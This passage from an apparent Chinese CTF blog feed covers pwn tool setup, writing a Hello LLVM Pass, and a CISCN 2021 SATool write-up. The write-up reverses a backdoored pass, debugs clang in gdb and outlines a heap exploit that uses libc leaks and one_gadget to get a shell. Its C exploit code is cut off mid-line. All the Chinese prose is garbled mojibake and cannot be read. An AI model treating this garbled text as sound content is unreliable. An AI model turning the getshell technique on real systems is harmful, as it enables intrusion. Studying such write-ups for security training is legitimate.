pwntools<br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>import pwn</code>æ¥æµ‹è¯•ä¸€äº›æ˜¯å¦æˆåŠŸå®‰è£…,å‡ºç°ä¸‹æ–¹æƒ…å†µåŸºæœ¬å°±å¯ä»¥äº†</p><p><img src="/img/article/pwn-envir/image-20220905162034730.png" alt="image-20220905162034730"></p><h2 id="pwndbg-amp-pwngdbå®‰è£…"><a href="#pwndbg-amp-pwngdbå®‰è£…" class="headerlink" title="pwndbg &amp; pwngdbå®‰è£…"></a>pwndbg &amp; pwngdbå®‰è£…</h2><p>è¿™ä¸¤ä¸ªå‡æ˜¯GDBçš„æ’ä»¶ä¹‹ä¸€ï¼Œç”¨äºåœ¨Linuxå¯¹ç¨‹åºè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œè€ŒåŠ¨æ€è°ƒè¯•ä¹Ÿæ˜¯PWNæœ€æ ¸å¿ƒçš„éƒ¨åˆ†ä¹‹ä¸€ã€‚æ‹¥æœ‰è¿™äº›å·¥å…·ï¼Œæˆ‘ä»¬èƒ½æ›´åŠ æ–¹ä¾¿çš„æŸ¥çœ‹ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå†…å­˜å˜åŒ–ã€‚å¦‚æ ˆã€å †ã€å¯„å­˜å™¨ç­‰ç­‰åœ°æ–¹çš„å†…å®¹ã€‚</p><blockquote><p>pwndbgå®‰è£…</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><blockquote><p>pwngdbå®‰è£…</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/<br>git <span class="hljs-built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git <br><span class="hljs-built_in">cp</span> ~/Pwngdb/.gdbinit ~/<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šä¸Šè¿°ä¸¤ä¸ªæ’ä»¶å¹¶ä¸å…¼å®¹ï¼Œä½†å¯ä»¥é€šè¿‡æ›´æ”¹.gdbinitæ–‡ä»¶åˆ‡æ¢ä½¿ç”¨</p><p>.gdbinitæ–‡ä»¶é…ç½®å¦‚ä¸‹</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">source /home/pwnki/pwndbg/gdbinit.<span class="hljs-property">py</span> <br>#source ~<span class="hljs-regexp">/peda/</span>peda.<span class="hljs-property">py</span> <span class="hljs-comment">//ä½¿ç”¨ pwndbg å°±è¦æŠŠ peda æ³¨é‡Šæ‰ï¼Œåè¿‡æ¥ä¹Ÿä¸€æ ·</span><br>source ~<span class="hljs-regexp">/Pwngdb/</span>pwngdb.<span class="hljs-property">py</span><br>source ~<span class="hljs-regexp">/Pwngdb/</span>angelheap/gdbinit.<span class="hljs-property">py</span><br><br>define hook-run<br>python<br><span class="hljs-keyword">import</span> angelheap<br>angelheap.<span class="hljs-title function_">init_angelheap</span>()<br>end<br>end<br></code></pre></td></tr></table></figure><p><img src="/img/article/pwn-envir/image-20220905165859512.png" alt="image-20220905165859512"></p><h2 id="checksecå®‰è£…"><a href="#checksecå®‰è£…" class="headerlink" title="checksecå®‰è£…"></a>checksecå®‰è£…</h2><p>ç”¨äºæ£€æµ‹ç¨‹åºå¼€å¯äº†å“ªäº›ä¿æŠ¤æœºåˆ¶ï¼Œå¾€å¾€æ˜¯PWNè§£é¢˜çš„ç¬¬ä¸€æ­¥ï¼Œå®‰è£…æ–¹å¼ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt install checksec<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹å¼:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ checksec ç¨‹åºæ–‡ä»¶<br></code></pre></td></tr></table></figure><p><img src="/img/article/pwn-envir/image-20220905164504590.png" alt="image-20220905164504590"></p><h2 id="æ›´å¤šæ’ä»¶"><a href="#æ›´å¤šæ’ä»¶" class="headerlink" title="æ›´å¤šæ’ä»¶"></a>æ›´å¤šæ’ä»¶</h2><blockquote><p>è™½ç„¶è¿˜æœ‰å¾ˆå¤šæ’ä»¶å¹¶æ²¡æœ‰æåŠï¼Œä½†å¯¹äºåˆšåˆšæ¥è§¦pwnçš„åŒå­¦æ¥è¯´ï¼Œä»¥ä¸Šæ’ä»¶å·²ç»å¤Ÿå®Œæˆä¸€éƒ¨åˆ†ç®€å•çš„pwné¢˜ç›®ï¼Œæ›´å¤šçš„æ’ä»¶éœ€è¦åœ¨å°†æ¥è‡ªå·±å­¦ä¹ çš„è¿‡ç¨‹ä¸­æ…¢æ…¢è¡¥å……ã€‚ä¸‹é¢åªåšä¸€åˆ—ä¸¾ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥è‡ªè¡Œæœç´¢æŸ¥çœ‹</p></blockquote><h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><blockquote><p>å¯ä»¥ç”¨äºä¸‹è½½å„ç§ç‰ˆæœ¬çš„glibcæ–‡ä»¶ï¼Œåœ¨æœ¬åœ°æ¨¡æ‹Ÿå…¶ä»–libcç¯å¢ƒæ—¶éå¸¸å®ç”¨</p></blockquote><h3 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h3><blockquote><p>ç”¨äºæ£€æµ‹ç¨‹åºæ²™ç›’é˜²æŠ¤å¼€å¯æƒ…å†µï¼Œå¾€å¾€åœ¨ä¸€äº›ä¼šç”¨åˆ°ORWç­‰æ–¹æ³•è§£é¢˜æ—¶ä¼šç”¨æ¥æ£€æµ‹</p></blockquote><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><blockquote><p>è¿™ä¸ªå·¥å…·å¯ä»¥ç”¨æŸ¥æ‰¾libcä¸­å¯ä»¥ç”¨æ¥getshellçš„ç‰‡æ®µåœ°å€ï¼Œåœ¨å„ç±»é¢˜ç›®ä¸­éƒ½åº”ç”¨å¹¿æ³›</p></blockquote><h3 id="LibcSeacher"><a href="#LibcSeacher" class="headerlink" title="LibcSeacher"></a>LibcSeacher</h3><blockquote><p>è¯¥å·¥å…·å¾€å¾€ç”¨äºç¡®å®šlibcç‰ˆæœ¬å¹¶ç¡®å®šå…¶libcç‰ˆæœ¬ä¸‹çš„å‡½æ•°åç§»ï¼Œå¯ä»¥è¢«ç½‘é¡µç«¯çš„libcåº“æ›¿ä»£</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>LLVM PASSç¯å¢ƒæ­å»ºä¸åŸºæœ¬ä½¿ç”¨</title>
    <link href="/2022/06/30/LLVM%20Pass%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/06/30/LLVM%20Pass%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="LLVM-Pass-ç¯å¢ƒæ­å»º"><a href="#LLVM-Pass-ç¯å¢ƒæ­å»º" class="headerlink" title="LLVM Pass ç¯å¢ƒæ­å»º"></a>LLVM Pass ç¯å¢ƒæ­å»º</h2><h3 id="é¢„ç¼–è¯‘åŒ…çš„å®‰è£…"><a href="#é¢„ç¼–è¯‘åŒ…çš„å®‰è£…" class="headerlink" title="é¢„ç¼–è¯‘åŒ…çš„å®‰è£…"></a>é¢„ç¼–è¯‘åŒ…çš„å®‰è£…</h3><p>åœ¨Ubuntuä¸Šï¼Œå¯ä»¥ç›´æ¥é€šè¿‡<code>apt</code>å®‰è£…llvmå’Œclangï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt install llvm<br>$ sudo apt install clang<br></code></pre></td></tr></table></figure><h3 id="ç¼–è¯‘å®‰è£…"><a href="#ç¼–è¯‘å®‰è£…" class="headerlink" title="ç¼–è¯‘å®‰è£…"></a>ç¼–è¯‘å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> llvm-project<br>$ <span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> build<br>$ cmake -G <span class="hljs-string">&quot;Unix Makefiles&quot;</span> -DLLVM_ENABLE_PROJECTS=<span class="hljs-string">&quot;clang&quot;</span> \<br>    -DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=<span class="hljs-string">&quot;X86&quot;</span> \<br>    -DBUILD_SHARED_LIBS=On ../llvm<br>$ make<br></code></pre></td></tr></table></figure><h2 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h2><h3 id="Hello-Pass-ç¼–å†™"><a href="#Hello-Pass-ç¼–å†™" class="headerlink" title="Hello Pass ç¼–å†™"></a>Hello Pass ç¼–å†™</h3><p>éšæ„æ‰¾ä¸€å¤„ä½œä¸ºé¡¹ç›®æ–‡ä»¶å¤¹Helloï¼Œå¹¶ç¼–å†™main.cå¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">loorain</span><span class="hljs-params">()</span>&#123;&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwn</span><span class="hljs-params">()</span>&#123;&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World LLVM PASS&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–å†™Hello.cppå¦‚ä¸‹ï¼Œå¦‚ä¸‹ä»£ç å«ä¹‰å¯é˜…è¯»å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://llvm.org/docs/WritingAnLLVMPass.html#introduction-what-is-a-pass">Writing an LLVM Pass â€” LLVM 15.0.0git documentation</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Pass.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Function.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Hello</span> : <span class="hljs-keyword">public</span> FunctionPass &#123;<br>        <span class="hljs-type">static</span> <span class="hljs-type">char</span> ID;<br>        <span class="hljs-built_in">Hello</span>() : <span class="hljs-built_in">FunctionPass</span>(ID) &#123;&#125;<br>        <br>        <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>&#123;<br>            <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;Hello: &quot;</span>;<br>            <span class="hljs-built_in">errs</span>().<span class="hljs-built_in">write_escaped</span>(F.<span class="hljs-built_in">getName</span>()) &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<span class="hljs-comment">//éå†æ‰€æœ‰çš„å‡½æ•°åç§°ï¼Œå¹¶ä»¥â€œHelloï¼š&lt;å‡½æ•°å&gt;â€çš„å½¢å¼è¾“å‡º</span><br>    &#125;;<br>&#125;<br><br><span class="hljs-type">char</span> Hello::ID = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//for opt</span><br><span class="hljs-function"><span class="hljs-type">static</span> RegisterPass&lt;Hello&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;Hello world Pass&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>)</span></span>;<br><span class="hljs-comment">//for clang</span><br><span class="hljs-function"><span class="hljs-type">static</span> llvm::RegisterStandardPasses <span class="hljs-title">Y</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    llvm::PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="hljs-params"><span class="hljs-function">    [](<span class="hljs-type">const</span> llvm::PassManagerBuilder &amp;Builder,</span></span><br><span class="hljs-params"><span class="hljs-function">       llvm::legacy::PassManagerBase &amp;PM) &#123; PM.add(<span class="hljs-keyword">new</span> Hello()); &#125;)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="å‘½ä»¤è¡Œç¼–è¯‘"><a href="#å‘½ä»¤è¡Œç¼–è¯‘" class="headerlink" title="å‘½ä»¤è¡Œç¼–è¯‘"></a>å‘½ä»¤è¡Œç¼–è¯‘</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`   <br></code></pre></td></tr></table></figure><ul><li><code>llvm-config</code>æä¾›äº†<code>CXXFLAGS</code>ä¸<code>LDFLAGS</code>å‚æ•°æ–¹ä¾¿æŸ¥æ‰¾LLVMçš„å¤´æ–‡ä»¶ä¸åº“æ–‡ä»¶ã€‚ å¦‚æœé“¾æ¥æœ‰é—®é¢˜ï¼Œè¿˜å¯ä»¥ç”¨<code>llvm-config --libs</code>æä¾›åŠ¨æ€é“¾æ¥çš„LLVMåº“ã€‚ å…·ä½“<code>llvm-config</code>æ‰“å°äº†ä»€ä¹ˆï¼Œè¯·è‡ªè¡Œå°è¯•æˆ–æŸ¥æ‰¾å®˜æ–¹æ–‡æ¡£ã€‚</li><li><code>-fPIC -shared</code> æ˜¾ç„¶æ˜¯ç¼–è¯‘åŠ¨æ€åº“çš„å¿…è¦å‚æ•°ã€‚</li><li>å› ä¸ºLLVMæ²¡ç”¨åˆ°RTTIï¼Œæ‰€ä»¥ç”¨<code>-fno-rtti</code> æ¥è®©æˆ‘ä»¬çš„Passä¸ä¹‹ä¸€è‡´ã€‚</li><li><code>-Wl,-znodelete</code>ä¸»è¦æ˜¯ä¸ºäº†åº”å¯¹LLVM 5.0+ä¸­åŠ è½½ModulePasså¼•èµ·segmentation faultçš„bugã€‚å¦‚æœä½ çš„Passç»§æ‰¿äº†ModulePassï¼Œè¿˜è¯·åŠ¡å¿…åŠ ä¸Šã€‚</li></ul><p>ç°åœ¨ï¼Œä½ æ‰‹ä¸­åº”è¯¥æœ‰ä¸€ä»½ç¼–è¯‘å¥½çš„LLVMHello.soäº†ã€‚æ ¹æ®åˆšæ‰é˜…è¯»è¿‡çš„å®˜æ–¹æ–‡æ¡£çš„ä»‹ç»ï¼Œä½ çŸ¥é“å¯ä»¥é€šè¿‡å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -S -emit-llvm main.c -o main.ll<br><span class="hljs-comment">#è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨&#x27;clang -c -emit-llvm main.c -o main.bc&#x27;åŒºåˆ«åœ¨äºbcæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶æ— æ³•é˜…è¯»</span><br><span class="hljs-variable">$opt</span> -load LLVMHello.so -hello main.ll -o main<br><span class="hljs-comment">#è¿™é‡Œçš„ -helloç”±Hello.cppä¸­çš„static RegisterPass&lt;Hello&gt; Xå‚æ•°å†³å®š</span><br></code></pre></td></tr></table></figure><blockquote><p>åœ¨ä½¿ç”¨optè¿›è¡ŒåŠ¨æ€é“¾æ¥æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼šError opening â€˜LLVMHello.soâ€™: LLVMHello.so: cannot open shared object file: No such file or directory</p><p>è¿™å®é™…æ˜¯ç”±äºlinuxä¸­åŠ¨æ€é“¾æ¥åº“çš„å­˜æ”¾åœ°ç‚¹ä¸€èˆ¬æ¯”è¾ƒå›ºå®šï¼Œæ— æ³•åœ¨é»˜è®¤åœ°å€æœç´¢åˆ°åä¸ºLLVMHello.soçš„åŠ¨æ€é“¾æ¥åº“ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨.bashrcæˆ–.zshrcä¸­åŠ å…¥ä»£è¡¨å½“å‰ç›®å½•çš„åœ°å€ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>export LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH:.  </p></blockquote><p><img src="/img/article/llvmCreate/1.png" alt="æ•ˆæœå›¾"></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç¡®å®è¾“å‡ºäº†main.cä¸­æ‰€æœ‰å‡½æ•°åç§°</p><h2 id="ä¾‹é¢˜ä¸€ï¼šCISCN-2021-SATool"><a href="#ä¾‹é¢˜ä¸€ï¼šCISCN-2021-SATool" class="headerlink" title="ä¾‹é¢˜ä¸€ï¼šCISCN 2021 SATool"></a>ä¾‹é¢˜ä¸€ï¼šCISCN 2021 SATool</h2><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><p>è¿™ç±»é¢˜ç›®å¯¹æˆ‘ä»¬æœ‰ç”¨çš„éƒ¨åˆ†optå’Œsoæ–‡ä»¶ï¼Œé€†å‘åˆ†æSAPass.soæ–‡ä»¶</p><p><img src="/img/article/llvmCreate/image-20220630204900814.png" alt="image-20220630204900814"></p><p>åœ¨<code>start</code>å‡½æ•°ä¸­ï¼Œä¸»è¦å†…å®¹æ˜¯æ³¨å†Œäº†ä¸€äº›å‡½æ•°ï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚åœ¨åˆ†æsoæ–‡ä»¶æ—¶ï¼Œä¸€èˆ¬é‡ç‚¹æ˜¯åˆ†æé‡å†™çš„<code>runOnFunction</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¤§å¤šå¯ä»¥åœ¨å‡½æ•°è¡¨çš„æœ€ä¸‹æ–¹æ‰¾åˆ°é‡å†™çš„<code>runOnFunction</code>å‡½æ•°</p><p><img src="/img/article/llvmCreate/image-20220630205306216.png" alt="image-20220630205306216"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°<code>sub_19D0</code>å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„å‡½æ•°ï¼Œåˆ†æå‡½æ•°å†…å®¹ï¼Œè¿™ä¹Ÿæ˜¯åœ¨æˆ‘çœ‹æ¥LLVM PASS ç±»é¢˜ç›®æœ€æ ¸å¿ƒçš„åœ°æ–¹â€”â€”ä»£ç é€†å‘åˆ†æã€‚æ¯•ç«Ÿä¸€ä¸ªå‡½æ•°å°±è¦æ•´æ•´550è¡Œï¼Œèƒ½å¤Ÿå¿«é€Ÿåœ°ç­›é€‰ä»€ä¹ˆæ˜¯å…³é”®ä¿¡æ¯ï¼Œä»€ä¹ˆæ˜¯åƒåœ¾ä¿¡æ¯æ˜¯å…³é”®ã€‚</p><p><img src="/img/article/llvmCreate/image-20220630210526791.png" alt="image-20220630210526791"></p><p>å‡½æ•°ä¸€å¼€å¤´å°±åˆ¤æ–­äº†æˆ‘ä»¬çš„å‡½æ•°åç§°æ˜¯ä¸æ˜¯<code>B4ckDo0r</code>, è¿™é‡Œç”±äºNameçš„ç±»å‹æ˜¯QWORDå­˜å‚¨ï¼Œå¹¶éç›´æ¥å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦åè¿‡æ¥è¯»ã€‚ä¹‹ååˆåˆ†äº†5ä¸ªæ“ä½œåˆ†åˆ«æ˜¯save, takeway, stealkey, fakekey, run.</p><p>åœ¨saveæ“ä½œä¸­ï¼Œè¿›è¡Œäº†å †å—çš„åˆ›å»º</p><p><img src="/img/article/llvmCreate/image-20220630211613541.png" alt="image-20220630211613541"></p><p>åœ¨stealkeyä¸­ï¼Œå°†åˆšåˆšç”³è¯·çš„heapä¸­å†…å®¹ç»™äº†204100ï¼ˆtakewayä¹Ÿæ˜¯è·³è½¬åˆ°äº†stealkeyä¸­ï¼‰</p><p><img src="/img/article/llvmCreate/image-20220630211950647.png" alt="image-20220630211950647"></p><p>åœ¨fakekeyä¸­ï¼Œå°†heapçš„å†…å®¹åŠ ä¸Šäº†å‚æ•°çš„å€¼ï¼Œå³å¯ç¼–è¾‘heapçš„å†…å®¹ï¼ˆè¿™é‡Œçš„heap_conå°±æ˜¯204100ï¼Œæˆ‘æ”¹äº†ä¸ªåå­—ï¼‰</p><p><img src="/img/article/llvmCreate/image-20220630212337680.png" alt="image-20220630212337680"></p><p>runå‡½æ•°ï¼Œå°±æ˜¯ç›´æ¥call *heap</p><p><img src="/img/article/llvmCreate/image-20220630213353185.png" alt="image-20220630213353185"></p><h3 id="GDB-è°ƒè¯•LLVM-PASS"><a href="#GDB-è°ƒè¯•LLVM-PASS" class="headerlink" title="GDB è°ƒè¯•LLVM PASS"></a>GDB è°ƒè¯•LLVM PASS</h3><p>é¦–å…ˆæˆ‘ä»¬ç¼–å†™éƒ¨åˆ†expï¼Œç±»ä¼¼æˆ‘ä»¬åŠ¨æ€åšæ™®é€šçš„PWNé¢˜ç›®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -S -emit-llvm exp.c -o exp.ll -v<br><span class="hljs-comment">#è¿™é‡ŒåŠ ä¸Š -v å¯ä»¥æ˜¾ç¤ºå‡ºè¯¦ç»†å‚æ•°</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦é€”ä¸­åœˆçš„è¿™ä¸€éƒ¨åˆ†</p><p><img src="/img/article/llvmCreate/image-20220630221103947.png" alt="image-20220630221103947"></p><blockquote><p>-triple x86_64-pc-linux-gnu -emit-llvm -disable-free -disable-llvm-verifier -discard-value-names -main-file-name exp.c -mrelocation-model static -mthread-model posix -mframe-pointer&#x3D;all -fmath-errno -fno-rounding-math -masm-verbose -mconstructor-aliases -munwind-tables -target-cpu x86-64 -dwarf-column-info -fno-split-dwarf-inlining -debugger-tuning&#x3D;gdb -v -resource-dir &#x2F;usr&#x2F;lib&#x2F;llvm-10&#x2F;lib&#x2F;clang&#x2F;10.0.0 -internal-isystem &#x2F;usr&#x2F;local&#x2F;include -internal-isystem &#x2F;usr&#x2F;lib&#x2F;llvm-10&#x2F;lib&#x2F;clang&#x2F;10.0.0&#x2F;include -internal-externc-isystem &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu -internal-externc-isystem &#x2F;include -internal-externc-isystem &#x2F;usr&#x2F;include -fdebug-compilation-dir &#x2F;home&#x2F;loorain&#x2F;ciscn&#x2F;CISCN_2021_pwn&#x2F;SATool_é™„ä»¶ -ferror-limit 19 -fmessage-length 0 -fgnuc-version&#x3D;4.2.1 -fobjc-runtime&#x3D;gcc -fdiagnostics-show-option -fcolor-diagnostics -faddrsig -o exp.ll -x c exp.c</p></blockquote><p>åœ¨å¦ä¸€ç»ˆç«¯ä¸­ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤,å³å¯å¼€å§‹è°ƒè¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb clang<br>GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2<br>......<br>......<br>pwndbg&gt; <span class="hljs-built_in">set</span> args -triple x86_64-pc-linux-gnu -emit-llvm -disable-free -disable-llvm-verifier -discard-value-names -main-file-name exp.c -mrelocation-model static -mthread-model posix -mframe-pointer=all -fmath-errno -fno-rounding-math -masm-verbose -mconstructor-aliases -munwind-tables -target-cpu x86-64 -dwarf-column-info -fno-split-dwarf-inlining -debugger-tuning=gdb -v -resource-dir /usr/lib/llvm-10/lib/clang/10.0.0 -internal-isystem /usr/local/include -internal-isystem /usr/lib/llvm-10/lib/clang/10.0.0/include -internal-externc-isystem /usr/include/x86_64-linux-gnu -internal-externc-isystem /include -internal-externc-isystem /usr/include -fdebug-compilation-dir /home/loorain/ciscn/CISCN_2021_pwn/SATool_é™„ä»¶ -ferror-limit 19 -fmessage-length 0 -fgnuc-version=4.2.1 -fobjc-runtime=gcc -fdiagnostics-show-option -fcolor-diagnostics -faddrsig -o exp.ll -x c exp.c<br>pwndbg&gt; b main<br>Breakpoint 1 at 0x40da90<br>pwndbg&gt; n<br>The program is not being run.<br>pwndbg&gt; r<br></code></pre></td></tr></table></figure><h3 id="è§£é¢˜æ€è·¯-amp-EXP"><a href="#è§£é¢˜æ€è·¯-amp-EXP" class="headerlink" title="è§£é¢˜æ€è·¯&amp;EXP"></a>è§£é¢˜æ€è·¯&amp;EXP</h3><ul><li><p>å…ˆç”³è¯·å¤šä¸ªchunkè®²tacheè…¾ç©ºï¼Œä»¥ç”³è¯·unsortbinä¸­çš„chunk</p></li><li><p>åœ¨ç”³è¯·unsortbinæ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ”¾ç½®â€™\x00â€˜ä»¥æ­¤ä¿ç•™libcä¿¡æ¯</p></li><li><p>åˆ©ç”¨stealkeyå’Œfakekeyå°†chunkä¸­çš„fdæ›´æ”¹ä¸ºonegadget</p></li><li><p>ç„¶ååˆ©ç”¨runç›´æ¥getshell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">save</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1,<span class="hljs-type">char</span> *a2)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fakekey</span><span 